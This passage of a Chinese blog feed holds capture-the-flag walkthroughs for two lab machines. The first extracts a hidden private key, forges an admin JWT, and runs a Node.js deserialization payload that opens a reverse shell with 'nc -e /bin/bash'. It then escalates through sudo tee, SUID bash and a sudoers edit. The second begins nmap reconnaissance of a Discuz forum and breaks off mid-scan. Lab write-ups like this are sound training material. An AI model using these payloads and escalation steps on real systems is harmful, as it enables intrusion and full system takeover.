data).<br></code></pre></td></tr></table></figure><p>发现里面隐藏着文件<code>private.key</code></p><p>提取隐藏文件<code>private.key</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> ./imgconceal --extract=miao.webp --no-password --output=private<br>Scanning cover image <span class="hljs-keyword">for</span> suitable carrier bits... Done!  <br>SUCCESS: extracted <span class="hljs-string">&#x27;private.key&#x27;</span> from <span class="hljs-string">&#x27;miao.webp&#x27;</span>.<br>  hidden on: Fri Feb 14 01:49:04 2025<br></code></pre></td></tr></table></figure><p>成功找到私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cat</span> private/private.key<br>-----BEGIN PRIVATE KEY-----<br>MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCq9/ZGu21YSX7c<br>nJ2E0v2w6adGuMhApMmBSe4DLKGpRAXQZtwy2UslqRZUt1vbefmvBboC9f11cfMb<br>gWaPturLwYQo/qLf8bNnMQww63MXsFAUmcgf24LSEi+faFr776IR/1+U8U76oSOW<br>buouGahGGWt74Pwdv/xXmqbZUNxXZOdrxDgixhV/UipWkxnex4GRphFe4KBcT/0i<br>1qAdgxpgDQbjVj5g+mmceOpSnc1gbsrtsEjgbWSvDEAWplNlRlAiUF0np6PqgpUL<br>OuxRTMHlj4Gdb7YfHp8Mz6KTgKE1+ko4vusvKq+9UqcgyUHW8VCmWvhFZ6iedRJ0<br>Ayzm+P1XAgMBAAECggEASm8HMTdDfUcOLNUgvSWw3ndzZNZpFL/JnPjHX2lsfomH<br>cHp/zsGMtno9pydnHhAmNN1s5QIc1aeFHIoDUXllEs2PENv/pDkSDtCrSpcPdhZE<br>XxuupbQHahcR1bh0uC/VozlH70v5wyMpn8JtQSHZgZ9qjLXgfcFKhwdlMcLDE2a7<br>2S5xac3OCQSD6Dak0pwTcnjUiQb43H6sR9d6DY6eMBTrCH+nJdHh3vOathhIzlj7<br>uDPYc5o5E6Ui6JJmrRt5H4FSAIzati3qw3+eE9hRbYqNJtYnQcxWXSY2HbLX8ooh<br>LUcAGm23+RSy7cBfdIQUSjWROqk6oE9XZaP6JE3YaQKBgQDegPsKL+6jBH16LKo3<br>vSm1vVh0aq87yv2zhTPNMctM30hOKzQqfNOt4yJQ5j86hEqMr1iHrgXOMRmxZAHt<br>Y330s50nva2aV2DekY6KZHk2prUfwMYp+UjAGL5ehRJ3goI5eD+Eo8+NIwk4hecM<br>kxnaBktuXjvhHaI5VZOTxr57GQKBgQDEtODMSu3OsqtDmQVyMjBiR5W1l8dp9vn3<br>jRo2uRc2EEKh2rOQxFJy4UYcg8O5Ekp0irD8jr7GGrHgTF+9o3u0k37h8AOZdR94<br>Yj5UGo3hkYzcSyAmg+5IauLNATXKAkMsF1VwRDLp34PWL3BDcS63LF6f+iSl9vYR<br>FVNlWoe57wKBgDxqYz/R4gcrmfKJnDKET4YEgrchnLEsnhSXr4gg5CXcXuKywnhi<br>6otFqDS1QCfgcemfVveIXhUtqd9L22Yc5L+D4cE/tJq67ReiCEU1oOAhBf84NdaB<br>1KosTcyWb3w52KhIKV8Xp6yX/dH2MdVtP9C+cs7mEXY/uKO+w9KVXXVJAoGAfMSC<br>BfLM7htz+Dd6NdnRyLTBJ+Ky0Oqf2L4+T1GNgHRF32XaGcv8w/NRxkppfd01LsC9<br>zCQ6q2tJQg0PeTjWAU7A30ye69pXcMNX537EWbw5jY11QhjSrkplu0S2OoC+3Juc<br>TM5lQOTOOa/zVEPZLsRM7Mn8Luz7XRCayiHnDy8CgYBsSiu45tsvRRKmMNY4Gxb5<br>6s2rgGPKbDxmXc4s5xqAqNi6MmFxcZQGkmw8Unzd1QB9HeFGlJGuqIeIj5kRLepL<br>4mKP3UvXUZGHWIl4MNSoqPh8u1Sq2P4W/K+NOlKTXnmrvldF+VxYaRTdqQ46+h3k<br>PkDtOtToiExm8jdJZ5lNdw==<br>-----END PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>从私钥中提权公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> openssl rsa -<span class="hljs-keyword">in</span> private/private.key -pubout  -out pkcs1.pub<br>writing RSA key<br></code></pre></td></tr></table></figure><p>查看公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cat</span> pkcs1.pub                                              <br>-----BEGIN PUBLIC KEY-----<br>MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqvf2RrttWEl+3JydhNL9<br>sOmnRrjIQKTJgUnuAyyhqUQF0GbcMtlLJakWVLdb23n5rwW6AvX9dXHzG4Fmj7bq<br>y8GEKP6i3/GzZzEMMOtzF7BQFJnIH9uC0hIvn2ha+++iEf9flPFO+qEjlm7qLhmo<br>Rhlre+D8Hb/8V5qm2VDcV2Tna8Q4IsYVf1IqVpMZ3seBkaYRXuCgXE/9ItagHYMa<br>YA0G41Y+YPppnHjqUp3NYG7K7bBI4G1krwxAFqZTZUZQIlBdJ6ej6oKVCzrsUUzB<br>5Y+BnW+2Hx6fDM+ik4ChNfpKOL7rLyqvvVKnIMlB1vFQplr4RWeonnUSdAMs5vj9<br>VwIDAQAB<br>-----END PUBLIC KEY-----<br></code></pre></td></tr></table></figure><h3 id="2-逻辑漏洞-JWT"><a href="#2-逻辑漏洞-JWT" class="headerlink" title="2.逻辑漏洞-JWT"></a>2.逻辑漏洞-JWT</h3><p>查看登录时所发生的数据包，找到cookie的token，发现是<code>jwt加密</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtaWFvIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3Mzk4NDQwODksImV4cCI6MTczOTg0NzY4OX0.UEQT7JzngvLbAkWLfq5mi1EQx1d8DTvZhbV1Cn_yydWlGFNdRTQ_KwTyKY_HGNwxqWXLeIB5jLS81ZH65UI9K82m7JrErLeo-UhXft9s6p__3_wajquk-yd0A_-yT-5i-HXlzY3m_CFjBuItNwgTTWP5fzvnOHqHw2ISsxcXlzpx4v-51cRSPOJIiBfcnn71E3yaVevlO5lU6_se2jAY5iHoSddA1_0YV0HsXkOLf49EcAvHW2xddq7VYNIWacWrFBSTZzByTequMkdsn5y945eczfRMLd92I5iXRRFhVIwqwrhcYevou9jmCyp0Q-8mgOiCSOlyYcc0GS7XNmufnA<br></code></pre></td></tr></table></figure><p>使用<code>jwt.io</code>对加密内容进行解密<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502181101901.png"></p><p>根据找到的公钥和私钥，对admin用户进行编码，得到admin用户的cookie<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502181103636.png"></p><p>对cookie进行替换，成功进入admin用户<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502181105678.png"></p><p>抓包测试，发送的消息，所获得的数据包需要修改cookie<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502181107299.png"></p><ul><li>并未执行相关的命令</li></ul><p>修改相关的格式，让其报错，发现是<code>nodejs反序列化</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502181108490.png"></p><p>群里大佬给的poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs node">&#123;&quot;data&quot;:&quot;&#123;\&quot;text\&quot;:\&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;nc -e /bin/bash 192.168.2.4 6666&#x27;, function(error,stdout, stderr) &#123; console.log(stdout) &#125;);&#125;( )\&quot;&#125;&quot;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502181132088.png"></p><p>成功反弹到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> nc -lvnp 6666                          <br>listening on [any] 6666 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.20] 37526<br><span class="hljs-built_in">id</span><br>uid=1000(cupido) gid=1000(cupido) grupos=1000(cupido),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(<span class="hljs-built_in">users</span>),106(netdev)<br></code></pre></td></tr></table></figure><ul><li>获取交换性好的shell<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br><span class="hljs-comment"># 按下 Ctrl+Z 将其挂起</span><br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br><span class="hljs-comment"># 按下回车</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 24 columns 80<br></code></pre></td></tr></table></figure>找到<code>user.txt</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.2$ <span class="hljs-built_in">cat</span> /home/cupido/user.txt<br>2032f531b474172175d02465b0a4941c<br></code></pre></td></tr></table></figure></li></ul><h1 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h1><p>查看当前用户被允许以<code>sudo权限</code>执行的命令有哪些</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.2$ <span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> cupido on tokenoflove:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,<br>    use_pty<br><br>User cupido may run the following commands on tokenoflove:<br>    (eros) NOPASSWD: /usr/bin/tee<br></code></pre></td></tr></table></figure><p>将字符串 <code>chmod +s /bin/bash</code>写入<code>miao.txt</code>，并赋予<code>suid</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.2$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;chmod +s /bin/bash&#x27;</span> | <span class="hljs-built_in">sudo</span> -u eros <span class="hljs-built_in">tee</span> /home/eros/miao.txt<br><span class="hljs-built_in">chmod</span> +s /bin/bash<br></code></pre></td></tr></table></figure><p>将用户 <code>cupido</code>的 <code>sudo</code>权限配置追加到 <code>/etc/sudoers</code>文件中，并且不需要密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -p<br>bash-5.2$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span>cupido ALL=(ALL:ALL) NOPASSWD:ALL<span class="hljs-string">&#x27; &gt;&gt; /etc/sudoers</span><br></code></pre></td></tr></table></figure><p>获取root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.2$ <span class="hljs-built_in">sudo</span> su -                                                <br><span class="hljs-built_in">sudo</span> su -<br>root@tokenoflove:~# <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) grupos=0(root)<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@tokenoflove:~# <span class="hljs-built_in">cat</span> /root/root.txt<br><span class="hljs-built_in">cat</span> /root/root.txt<br>e0772277e3cdf59b65c6b76df5b84ea6<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Thehackerslabs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IPFS</tag>
      
      <tag>JWT</tag>
      
      <tag>sudo-tee</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Chat2</title>
    <link href="/Maze-sec/Chat2/"/>
    <url>/Maze-sec/Chat2/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li><li>WP参考：<code>https://7r1umphk.github.io/post/nei-bu-_Chat2.html</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sn 192.168.2.0/24                                     <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-20 16:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.0014s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.0011s latency).<br>MAC Address: 08:00:27:10:EF:B6 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.69<br>Host is up (0.0016s latency).<br>MAC Address: 08:00:27:EC:97:DA (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.02 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.69</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -p- 192.168.2.69<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-20 16:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.69<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:EC:97:DA (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 47.83 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.69 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-20 16:14 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.69<br>Host is up (0.00085s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-generator: Discuz! X3.5<br>| http-robots.txt: 20 disallowed entries (15 shown)<br>| /api/ /data/ /source/ /install/ /template/default/ <br>| /config/ /uc_client/ /uc_server/ /admin.php /search.php <br>| /member.php /api.php /misc.php /connect.php <br>|_/forum.php?mod=redirect*<br>|_http-title: \xE8\xAE\xBA\xE5\x9D\x9B -  Powered by Discuz!<br>MAC Address: 08:00:27:EC:97:DA (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.82 seconds<br></code></pre></td></tr></table></figure><ol><li><strong>22端口:ssh服务</strong>，版本为<code>OpenSSH 8.4p1</code></li><li><strong>80端口:http服务</strong>，版本为<code>Apache httpd 2.4.62</code>，存在目录<code>/robots.txt</code>，框架为<code>Discuz</code></li></ol><h3 id="3-udp端口扫描"><a href="#3-udp端口扫描" class="headerlink" title="3.udp端口扫描"></a>3.udp端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sU --top-ports 100 192.168.2.69                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-20 16:15 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.69<br>Host is up (0.0017s latency).<br>Not shown: 99 closed udp ports (port-unreach)<br>PORT   STATE         SERVICE<br>68/udp open|filtered dhcpc<br>MAC Address: 08:00:27:EC:97:DA (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 101.13 seconds<br></code></pre></td></tr></table></figure><p>没有开放的端口</p><h3 id="4-漏洞脚本扫描"><a href="#4-漏洞脚本扫描" class="headerlink" title="4.漏洞脚本扫描"></a>4.漏洞脚本扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --script=vuln -p22,80 192.168.2.69                  <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-20 16:18 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.69<br>Host is up (0.0011s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>| http-csrf: <br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.2.69<br>|   Found the following possible CSRF vulnerabilities: <br>|     <br>|     Path: http://192.168.2.69:80/<br>|     Form <span class="hljs-built_in">id</span>: lsform<br>|     Form action: member.php?mod=logging&amp;action=login&amp;loginsubmit=<span class="hljs-built_in">yes</span>&amp;infloat=<span class="hljs-built_in">yes</span>&amp;lssubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/<br>|     Form <span class="hljs-built_in">id</span>: scbar_form<br>|     Form action: search.php?searchsubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/search.php?mod=forum&amp;amp;srchtxt=%E6%B4%BB%E5%8A%A8&amp;amp;formhash=a8c08364&amp;amp;searchsubmit=<span class="hljs-literal">true</span>&amp;amp;<span class="hljs-built_in">source</span>=hotsearch<br>|     Form <span class="hljs-built_in">id</span>: searchlogo<br>|     Form action: search.php?mod=forum<br>|     <br>|     Path: http://192.168.2.69:80/forum.php<br>|     Form <span class="hljs-built_in">id</span>: lsform<br>|     Form action: member.php?mod=logging&amp;action=login&amp;loginsubmit=<span class="hljs-built_in">yes</span>&amp;infloat=<span class="hljs-built_in">yes</span>&amp;lssubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/forum.php<br>|     Form <span class="hljs-built_in">id</span>: scbar_form<br>|     Form action: search.php?searchsubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/forum.php?showmobile=<span class="hljs-built_in">yes</span><br>|     Form <span class="hljs-built_in">id</span>: lsform<br>|     Form action: member.php?mod=logging&amp;action=login&amp;loginsubmit=<span class="hljs-built_in">yes</span>&amp;infloat=<span class="hljs-built_in">yes</span>&amp;lssubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/forum.php?showmobile=<span class="hljs-built_in">yes</span><br>|     Form <span class="hljs-built_in">id</span>: scbar_form<br>|     Form action: search.php?searchsubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/search.php?searchsubmit=<span class="hljs-built_in">yes</span><br>|     Form <span class="hljs-built_in">id</span>: searchlogo<br>|     Form action: search.php?mod=forum<br>|     <br>|     Path: http://192.168.2.69:80/member.php?mod=logging&amp;amp;action=login&amp;amp;loginsubmit=<span class="hljs-built_in">yes</span>&amp;amp;infloat=<span class="hljs-built_in">yes</span>&amp;amp;lssubmit=<span class="hljs-built_in">yes</span><br>|     Form <span class="hljs-built_in">id</span>: scbar_form<br>|     Form action: search.php?searchsubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/search.php?mod=forum&amp;amp;srchtxt=discuz&amp;amp;formhash=a8c08364&amp;amp;searchsubmit=<span class="hljs-literal">true</span>&amp;amp;<span class="hljs-built_in">source</span>=hotsearch<br>|     Form <span class="hljs-built_in">id</span>: searchlogo<br>|     Form action: search.php?mod=forum<br>|     <br>|     Path: http://192.168.2.69:80/forum.php?mod=redirect&amp;amp;tid=1&amp;amp;goto=lastpost<br>|     Form <span class="hljs-built_in">id</span>: lsform<br>|     Form action: member.php?mod=logging&amp;action=login&amp;loginsubmit=<span class="hljs-built_in">yes</span>&amp;infloat=<span class="hljs-built_in">yes</span>&amp;lssubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: http://192.168.2.69:80/forum.php?mod=redirect&amp;amp;tid=1&amp;amp;goto=lastpost<br>|     Form <span class="hljs-built_in">id</span>: scbar_form<br>|     Form action: search.php?searchsubmit=<span class="hljs-built_in">yes</span><br>|     <br>|     Path: 